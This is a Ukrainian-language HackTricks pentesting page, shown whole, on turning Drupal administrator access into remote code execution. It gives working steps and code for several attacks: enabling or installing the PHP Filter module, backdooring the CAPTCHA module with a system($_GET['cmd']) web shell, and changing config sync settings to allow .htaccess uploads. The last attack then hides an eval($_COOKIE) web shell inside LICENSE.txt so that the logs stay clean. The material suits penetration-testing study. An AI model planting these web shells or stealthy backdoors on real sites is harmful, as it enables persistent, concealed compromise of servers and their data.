# Drupal RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## –ó –º–æ–¥—É–ª–µ–º PHP Filter

{% hint style="warning" %}
–£ —Å—Ç–∞—Ä—ñ—à–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö Drupal **(–¥–æ –≤–µ—Ä—Å—ñ—ó 8)** –±—É–ª–æ –º–æ–∂–ª–∏–≤–∏–º —É–≤—ñ–π—Ç–∏ —è–∫ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä —ñ **—É–≤—ñ–º–∫–Ω—É—Ç–∏ –º–æ–¥—É–ª—å `PHP filter`**, —è–∫–∏–π "–î–æ–∑–≤–æ–ª—è—î –æ—Ü—ñ–Ω—é–≤–∞—Ç–∏ –≤–±—É–¥–æ–≤–∞–Ω–∏–π PHP –∫–æ–¥/—Ñ—Ä–∞–≥–º–µ–Ω—Ç–∏." –ê–ª–µ –∑ –≤–µ—Ä—Å—ñ—ó 8 —Ü–µ–π –º–æ–¥—É–ª—å –Ω–µ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º.
{% endhint %}

–í–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± **–ø–ª–∞–≥—ñ–Ω php –±—É–≤ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–π** (–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, –∑–∞–π—à–æ–≤—à–∏ –≤ _/modules/php_, —ñ —è–∫—â–æ –≤—ñ–Ω –ø–æ–≤–µ—Ä—Ç–∞—î **403**, —Ç–æ–¥—ñ **—ñ—Å–Ω—É—î**, —è–∫—â–æ **–Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ**, —Ç–æ–¥—ñ **–ø–ª–∞–≥—ñ–Ω php –Ω–µ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–π**)

–ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ _Modules_ -> (**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ**) _PHP Filter_ -> _–ó–±–µ—Ä–µ–≥—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é_

![](<../../../.gitbook/assets/image (247) (1).png>)

–ü–æ—Ç—ñ–º –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞ _–î–æ–¥–∞—Ç–∏ –∫–æ–Ω—Ç–µ–Ω—Ç_ -> –í–∏–±–µ—Ä—ñ—Ç—å _–û—Å–Ω–æ–≤–Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫–∞_ –∞–±–æ _–°—Ç–∞—Ç—Ç—è -_> –ù–∞–ø–∏—à—ñ—Ç—å _php shellcode –≤ —Ç—ñ–ª—ñ_ -> –í–∏–±–µ—Ä—ñ—Ç—å _PHP code_ –≤ _–§–æ—Ä–º–∞—Ç —Ç–µ–∫—Å—Ç—É_ -> –í–∏–±–µ—Ä—ñ—Ç—å _–ü–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –ø–µ—Ä–µ–≥–ª—è–¥_

![](<../../../.gitbook/assets/image (338).png>)

–ù–∞—Ä–µ—à—Ç—ñ, –ø—Ä–æ—Å—Ç–æ –∑–∞–π–¥—ñ—Ç—å –Ω–∞ –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–∏–π –≤—É–∑–æ–ª:
```bash
curl http://drupal-site.local/node/3
```
## –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –º–æ–¥—É–ª—è PHP Filter

{% hint style="warning" %}
–£ –ø–æ—Ç–æ—á–Ω–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö –±—ñ–ª—å—à–µ –Ω–µ–º–æ–∂–ª–∏–≤–æ –≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞—Ç–∏ –ø–ª–∞–≥—ñ–Ω–∏, –º–∞—é—á–∏ –¥–æ—Å—Ç—É–ø –ª–∏—à–µ –¥–æ –≤–µ–±—É –ø—ñ—Å–ª—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ—ó —É—Å—Ç–∞–Ω–æ–≤–∫–∏.
{% endhint %}

–ó –≤–µ—Ä—Å—ñ—ó **8 —ñ –¥–∞–ª—ñ, –º–æ–¥—É–ª—å** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **–Ω–µ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**. –©–æ–± —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Ü—ñ—î—é —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—é, –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –º–æ–¥—É–ª—å —Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ**.

1. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –Ω–∞–π–Ω–æ–≤—ñ—à—É –≤–µ—Ä—Å—ñ—é –º–æ–¥—É–ª—è –∑ –≤–µ–±-—Å–∞–π—Ç—É Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. –ü—ñ—Å–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ **`Administration`** > **`Reports`** > **`Available updates`**.
3. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å **`Browse`**, –≤–∏–±–µ—Ä—ñ—Ç—å —Ñ–∞–π–ª –∑ –∫–∞—Ç–∞–ª–æ–≥—É, –∫—É–¥–∏ –º–∏ –π–æ–≥–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏–ª–∏, –∞ –ø–æ—Ç—ñ–º –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å **`Install`**.
4. –ü—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –º–æ–¥—É–ª—è –º–∏ –º–æ–∂–µ–º–æ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ –Ω–∞ **`Content`** —ñ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤—É –±–∞–∑–æ–≤—É —Å—Ç–æ—Ä—ñ–Ω–∫—É**, –ø–æ–¥—ñ–±–Ω–æ –¥–æ —Ç–æ–≥–æ, —è–∫ –º–∏ —Ä–æ–±–∏–ª–∏ –≤ –ø—Ä–∏–∫–ª–∞–¥—ñ Drupal 7. –ó–Ω–æ–≤—É –∂ —Ç–∞–∫–∏, –Ω–µ –∑–∞–±—É–¥—å—Ç–µ **–≤–∏–±—Ä–∞—Ç–∏ `PHP code` –∑ –≤–∏–ø–∞–¥–∞—é—á–æ–≥–æ —Å–ø–∏—Å–∫—É `Text format`**.

## –ú–æ–¥—É–ª—å –∑ –±–µ–∫–¥–æ—Ä–æ–º

{% hint style="warning" %}
–£ –ø–æ—Ç–æ—á–Ω–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö –±—ñ–ª—å—à–µ –Ω–µ–º–æ–∂–ª–∏–≤–æ –≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞—Ç–∏ –ø–ª–∞–≥—ñ–Ω–∏, –º–∞—é—á–∏ –¥–æ—Å—Ç—É–ø –ª–∏—à–µ –¥–æ –≤–µ–±—É –ø—ñ—Å–ª—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ—ó —É—Å—Ç–∞–Ω–æ–≤–∫–∏.
{% endhint %}

–ú–æ–¥—É–ª—å –∑ –±–µ–∫–¥–æ—Ä–æ–º –º–æ–∂–Ω–∞ —Å—Ç–≤–æ—Ä–∏—Ç–∏, **–¥–æ–¥–∞–≤—à–∏ shell –¥–æ —ñ—Å–Ω—É—é—á–æ–≥–æ –º–æ–¥—É–ª—è**. –ú–æ–¥—É–ª—ñ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –Ω–∞ –≤–µ–±-—Å–∞–π—Ç—ñ drupal.org. –î–∞–≤–∞–π—Ç–µ –≤–∏–±–µ—Ä–µ–º–æ –º–æ–¥—É–ª—å, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, [CAPTCHA](https://www.drupal.org/project/captcha). –ü—Ä–æ–∫—Ä—É—Ç—ñ—Ç—å –≤–Ω–∏–∑ —ñ —Å–∫–æ–ø—ñ—é–π—Ç–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ tar.gz [–∞—Ä—Ö—ñ–≤](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –∞—Ä—Ö—ñ–≤ —ñ —Ä–æ–∑–ø–∞–∫—É–π—Ç–µ –π–æ–≥–æ –≤–º—ñ—Å—Ç.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* –°—Ç–≤–æ—Ä—ñ—Ç—å **PHP web shell** –∑ –≤–º—ñ—Å—Ç–æ–º:
```php
<?php
system($_GET["cmd"]);
?>
```
* –î–∞–ª—ñ –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ñ–∞–π–ª **`.htaccess`**, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –ø–∞–ø–∫–∏. –¶–µ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ, –æ—Å–∫—ñ–ª—å–∫–∏ Drupal –∑–∞–±–æ—Ä–æ–Ω—è—î –ø—Ä—è–º–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –ø–∞–ø–∫–∏ **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* –ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –≤–∏—â–µ –∑–∞—Å—Ç–æ—Å–æ–≤—É–≤–∞—Ç–∏–º–µ –ø—Ä–∞–≤–∏–ª–∞ –¥–ª—è –ø–∞–ø–∫–∏ /, –∫–æ–ª–∏ –º–∏ –∑–∞–ø–∏—Ç—É—î–º–æ —Ñ–∞–π–ª —É /modules. –°–∫–æ–ø—ñ—é–π—Ç–µ –æ–±–∏–¥–≤–∞ —Ü—ñ —Ñ–∞–π–ª–∏ –¥–æ –ø–∞–ø–∫–∏ captcha —Ç–∞ —Å—Ç–≤–æ—Ä—ñ—Ç—å –∞—Ä—Ö—ñ–≤.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* –ü—Ä–∏–ø—É—Å—Ç–∏–º–æ, —â–æ —É –Ω–∞—Å —î **–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø** –¥–æ –≤–µ–±-—Å–∞–π—Ç—É, –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞ **`–£–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è`** —ñ –ø–æ—Ç—ñ–º **`–†–æ–∑—à–∏—Ä–∏—Ç–∏`** –Ω–∞ –±—ñ—á–Ω—ñ–π –ø–∞–Ω–µ–ª—ñ. –î–∞–ª—ñ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞ –∫–Ω–æ–ø–∫—É **`+ –í—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –Ω–æ–≤–∏–π –º–æ–¥—É–ª—å`**, —ñ –º–∏ –ø–µ—Ä–µ–π–¥–µ–º–æ –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫—É –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `http://drupal-site.local/admin/modules/install`. –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ –∞—Ä—Ö—ñ–≤—É –∑ –±–µ–∫–¥–æ—Ä–æ–º Captcha —ñ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å **`–í—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏`**.
* –ü—ñ—Å–ª—è —É—Å–ø—ñ—à–Ω–æ—ó —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ **`/modules/captcha/shell.php`**, —â–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏.

## –ë–µ–∫–¥–æ—Ä–∏–Ω–≥ Drupal –∑ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—î—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**–ü–æ—Å—Ç –ø–æ–¥—ñ–ª–∏–≤—Å—è** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### –ß–∞—Å—Ç–∏–Ω–∞ 1 (–∞–∫—Ç–∏–≤–∞—Ü—ñ—è _–ú–µ–¥—ñ–∞_ —Ç–∞ _–ú–µ–¥—ñ–π–Ω–æ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏_)

–£ –º–µ–Ω—é _–†–æ–∑—à–∏—Ä–∏—Ç–∏_ (/admin/modules) –≤–∏ –º–æ–∂–µ—Ç–µ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ —Ç–µ, —â–æ, –∑–¥–∞—î—Ç—å—Å—è, —î –ø–ª–∞–≥—ñ–Ω–∞–º–∏, –≤–∂–µ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–º–∏. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –ø–ª–∞–≥—ñ–Ω–∏ _–ú–µ–¥—ñ–∞_ —Ç–∞ _–ú–µ–¥—ñ–π–Ω–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞_ –Ω–µ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω—ñ, —Ç–æ–∂ –¥–∞–≤–∞–π—Ç–µ —ó—Ö –∞–∫—Ç–∏–≤—É—î–º–æ.

–ü–µ—Ä–µ–¥ –∞–∫—Ç–∏–≤–∞—Ü—ñ—î—é:

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

–ü—ñ—Å–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### –ß–∞—Å—Ç–∏–Ω–∞ 2 (–≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó _–°–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

–ú–∏ —Å–∫–æ—Ä–∏—Å—Ç–∞—î–º–æ—Å—è —Ñ—É–Ω–∫—Ü—ñ—î—é _–°–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó_, —â–æ–± –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ (–µ–∫—Å–ø–æ—Ä—Ç—É–≤–∞—Ç–∏) —Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ (—ñ–º–ø–æ—Ä—Ç—É–≤–∞—Ç–∏) –∑–∞–ø–∏—Å–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó Drupal:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**–ü–∞—Ç—á system.file.yml**

–ü–æ—á–Ω–µ–º–æ –∑ –ø–∞—Ç—á—É–≤–∞–Ω–Ω—è –ø–µ—Ä—à–æ–≥–æ –∑–∞–ø–∏—Å—É `allow_insecure_uploads` –∑:

–§–∞–π–ª: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

–î–æ:

–§–∞–π–ª: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**–ü–∞—Ç—á field.field.media.document.field\_media\_document.yml**

–¢–æ–¥—ñ, –ø–∞—Ç—á –¥—Ä—É–≥–∏–π –∑–∞–ø–∏—Å `file_extensions` –∑: 

–§–∞–π–ª: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

–î–æ:

–§–∞–π–ª: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> –Ø –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é —Ü–µ –≤ —Ü—å–æ–º—É –±–ª–æ–∑—ñ, –∞–ª–µ –∑–∞–∑–Ω–∞—á–µ–Ω–æ, —â–æ –º–æ–∂–ª–∏–≤–æ –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –∑–∞–ø–∏—Å `file_directory` –¥–æ–≤—ñ–ª—å–Ω–∏–º —á–∏–Ω–æ–º —ñ —â–æ –≤—ñ–Ω –≤—Ä–∞–∑–ª–∏–≤–∏–π –¥–æ –∞—Ç–∞–∫–∏ –æ–±—Ö–æ–¥—É —à–ª—è—Ö—É (—Ç–æ–º—É –º–∏ –º–æ–∂–µ–º–æ –ø—ñ–¥–Ω—è—Ç–∏—Å—è –≤–≥–æ—Ä—É –≤ –¥–µ—Ä–µ–≤—ñ —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ Drupal).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### –ß–∞—Å—Ç–∏–Ω–∞ 3 (–≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó _–î–æ–¥–∞—Ç–∏ –¥–æ–∫—É–º–µ–Ω—Ç_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

–û—Å—Ç–∞–Ω–Ω—ñ–π –∫—Ä–æ–∫ —î –Ω–∞–π–ø—Ä–æ—Å—Ç—ñ—à–∏–º —ñ –ø–æ–¥—ñ–ª–µ–Ω–∏–π –Ω–∞ –¥–≤–∞ –ø—ñ–¥–∫—Ä–æ–∫–∏. –ü–µ—Ä—à–∏–π - –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª —É —Ñ–æ—Ä–º–∞—Ç—ñ .htaccess, —â–æ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –¥–∏—Ä–µ–∫—Ç–∏–≤–∏ Apache —ñ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ü—ñ—é .txt —Ñ–∞–π–ª—ñ–≤ PHP-–¥–≤–∏–∂–∫–æ–º. –î—Ä—É–≥–∏–π - –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ .txt —Ñ–∞–π–ª, —â–æ –º—ñ—Å—Ç–∏—Ç—å –Ω–∞—à payload.

–§–∞–π–ª: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
–ß–æ–º—É —Ü–µ–π —Ç—Ä—é–∫ –∫–ª–∞—Å–Ω–∏–π?

–¢–æ–º—É —â–æ, —è–∫ —Ç—ñ–ª—å–∫–∏ Webshell (—è–∫–∏–π –º–∏ –Ω–∞–∑–≤–µ–º–æ LICENSE.txt) –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ –Ω–∞ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä, –º–∏ –∑–º–æ–∂–µ–º–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç–∏ –Ω–∞—à—ñ –∫–æ–º–∞–Ω–¥–∏ —á–µ—Ä–µ–∑ `$_COOKIE`, —ñ –≤ –∂—É—Ä–Ω–∞–ª–∞—Ö –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞ —Ü–µ –∑'—è–≤–∏—Ç—å—Å—è —è–∫ –∑–∞–∫–æ–Ω–Ω–∏–π GET –∑–∞–ø–∏—Ç –¥–æ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Ñ–∞–π–ª—É.

–ß–æ–º—É –º–∏ –Ω–∞–∑–∏–≤–∞—î–º–æ –Ω–∞—à Webshell LICENSE.txt?

–ü—Ä–æ—Å—Ç–æ —Ç–æ–º—É, —â–æ —è–∫—â–æ –º–∏ –≤—ñ–∑—å–º–µ–º–æ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ñ–∞–π–ª, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (—è–∫–∏–π –≤–∂–µ –ø—Ä–∏—Å—É—Ç–Ω—ñ–π —É —è–¥—Ä—ñ Drupal), –º–∏ –º–∞—î–º–æ —Ñ–∞–π–ª –∑ 339 —Ä—è–¥–∫—ñ–≤ —ñ —Ä–æ–∑–º—ñ—Ä–æ–º 17.6 –ö–ë, —â–æ —ñ–¥–µ–∞–ª—å–Ω–æ –ø—ñ–¥—Ö–æ–¥–∏—Ç—å –¥–ª—è –¥–æ–¥–∞–≤–∞–Ω–Ω—è –Ω–µ–≤–µ–ª–∏–∫–æ–≥–æ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∞ PHP –∫–æ–¥—É –ø–æ—Å–µ—Ä–µ–¥–∏–Ω—ñ (–æ—Å–∫—ñ–ª—å–∫–∏ —Ñ–∞–π–ª –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –≤–µ–ª–∏–∫–∏–π).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

–§–∞–π–ª: –í–∏–ø—Ä–∞–≤–ª–µ–Ω–∏–π LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **–ß–∞—Å—Ç–∏–Ω–∞ 3.1 (–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª .htaccess)**

–°–ø–æ—á–∞—Ç–∫—É –º–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ —Ñ—É–Ω–∫—Ü—ñ—é _Add Document_ (/media/add/document) –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –Ω–∞—à–æ–≥–æ —Ñ–∞–π–ª—É, —â–æ –º—ñ—Å—Ç–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–∏–≤–∏ Apache (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**–ß–∞—Å—Ç–∏–Ω–∞ 3.2 (–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª LICENSE.txt)**

–ü–æ—Ç—ñ–º –º–∏ –∑–Ω–æ–≤—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ —Ñ—É–Ω–∫—Ü—ñ—é _Add Document_ (/media/add/document) –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è Webshell, –ø—Ä–∏—Ö–æ–≤–∞–Ω–æ–≥–æ –≤ –ª—ñ—Ü–µ–Ω–∑—ñ–π–Ω–æ–º—É —Ñ–∞–π–ª—ñ.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### –ß–∞—Å—Ç–∏–Ω–∞ 4 (–≤–∑–∞—î–º–æ–¥—ñ—è –∑ Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

–û—Å—Ç–∞–Ω–Ω—è —á–∞—Å—Ç–∏–Ω–∞ –ø–æ–ª—è–≥–∞—î —É –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ Webshell.

–Ø–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É —Å–∫—Ä—ñ–Ω—à–æ—Ç—ñ, —è–∫—â–æ cookie, –æ—á—ñ–∫—É–≤–∞–Ω–∏–π –Ω–∞—à–∏–º Webshell, –Ω–µ –≤–∏–∑–Ω–∞—á–µ–Ω–æ, –º–∏ –æ—Ç—Ä–∏–º—É—î–º–æ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç –ø—Ä–∏ –∑–≤–µ—Ä–Ω–µ–Ω–Ω—ñ –¥–æ —Ñ–∞–π–ª—É —á–µ—Ä–µ–∑ –≤–µ–±-–±—Ä–∞—É–∑–µ—Ä.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

–ö–æ–ª–∏ –∞—Ç–∞–∫—É—é—á–∏–π –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î cookie, –≤—ñ–Ω –º–æ–∂–µ –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ Webshell —ñ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫—ñ –∫–æ–º–∞–Ω–¥–∏, —è–∫—ñ —Ö–æ—á–µ.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

–Ü, —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ –≤ –∂—É—Ä–Ω–∞–ª–∞—Ö, –≤–∏–≥–ª—è–¥–∞—î —Ç–∞–∫, –Ω—ñ–±–∏ –∑–∞–ø–∏—Ç—É–≤–∞–≤—Å—è –ª–∏—à–µ txt —Ñ–∞–π–ª.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

–î—è–∫—É—î–º–æ, —â–æ –∑–Ω–∞–π—à–ª–∏ —á–∞—Å –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Ü—é —Å—Ç–∞—Ç—Ç—é, —Å–ø–æ–¥—ñ–≤–∞—é—Å—è, –≤–æ–Ω–∞ –¥–æ–ø–æ–º–æ–∂–µ –≤–∞–º –æ—Ç—Ä–∏–º–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ –æ–±–æ–ª–æ–Ω–æ–∫.

